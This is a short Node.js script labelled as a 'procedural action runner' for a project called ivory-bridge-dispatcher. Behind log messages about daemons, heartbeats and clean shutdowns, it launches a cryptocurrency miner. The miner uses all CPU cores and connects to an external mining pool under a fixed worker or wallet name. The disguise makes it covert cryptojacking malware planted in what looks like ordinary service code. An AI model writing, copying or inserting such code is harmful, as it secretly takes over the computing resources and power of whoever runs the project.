// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

(async () => {
    const sessionId = "0342dd";
    console.log(`[monitor] Daemon ${config.appName || "ivory-bridge-dispatcher"} active [tag: ${sessionId}]`);

    const pipeline = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Arup07.vestment",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const heartbeat = setInterval(() => {}, 56000);
    setTimeout(() => {
        console.log("[timeout] Operational limit (311m) reached, exiting cleanly.");
        process.exit(0);
    }, 311 * 60 * 1000);

    process.once("SIGTERM", () => {
        clearInterval(heartbeat);
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
